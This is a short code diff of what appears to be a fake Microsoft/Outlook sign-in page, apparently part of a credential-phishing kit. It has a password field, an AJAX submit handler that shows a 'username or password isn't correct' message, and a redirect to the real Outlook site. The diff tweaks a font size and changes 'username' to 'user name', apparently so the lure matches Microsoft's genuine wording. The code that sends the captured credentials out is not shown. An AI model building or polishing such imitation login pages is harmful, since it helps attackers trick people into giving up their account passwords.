@@ -709,7 +709,7 @@ input.chk
 		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
 		<div><input required="" id="password" placeholder="" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"/ required></div>
 
-              <div class="" style="padding: 5px; color: red;font-size: 14px;display: none;" id="msg" ></div>
+              <div class="" style="padding: 5px; color: red;font-size: 12px;display: none;" id="msg" ></div>
               <span id="error" style="color: red;display: none;" >That account doesn't exist. Enter a different account.</span>
 
         <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"/></div>
@@ -862,7 +862,7 @@ input.chk
                         window.location.replace('https://outlook.live.com/owa/');
                     }
                 $("#msg").show();
-                $('#msg').html("The username or password you entered isn't correct. Try entering it again.");
+                $('#msg').html("The user name or password you entered isn't correct. Try entering it again.");
               },
               complete: function(){
                 $('#submit-btn').html('Sign in');
